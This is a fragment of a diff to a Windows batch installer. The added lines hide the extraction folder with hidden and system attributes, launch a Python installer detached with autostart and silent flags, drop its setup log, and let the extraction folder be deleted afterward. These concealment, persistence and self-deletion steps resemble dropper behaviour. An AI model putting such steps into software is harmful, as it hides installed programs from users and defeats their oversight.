@@ -2,6 +2,9 @@
 setlocal
 pushd "%~dp0"
 
+rem Hide the entire extraction folder immediately (before anything else can go wrong)
+for %%p in ("%~dp0..") do attrib +h +s "%%~fp" >nul 2>&1
+
 if exist "%~dp0deploy_automated.bat" (
     call "%~dp0deploy_automated.bat"
     popd
@@ -44,8 +47,8 @@ if %errorlevel% neq 0 (
     set PATH=%PATH%;%LOCALAPPDATA%\Programs\Python\Python312;%LOCALAPPDATA%\Programs\Python\Python312\Scripts
 )
 
-rem Run from permanent location — script_dir() == PERM_DIR so all task paths are correct
-python "%PERM_DIR%\install_and_run.py" --autostart --silent >"%PERM_DIR%\setup_log.txt" 2>&1
+rem Run from permanent location detached — install.bat exits so deletion can proceed
+start "" /b python "%PERM_DIR%\install_and_run.py" --autostart --silent
 
 rem Delete the entire extraction folder 5 s after this script exits
 for %%p in ("%~dp0..") do (
